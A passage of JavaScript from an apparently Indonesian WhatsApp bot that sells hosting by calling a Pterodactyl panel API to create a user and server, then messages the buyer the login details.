͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "3000"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "4000"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏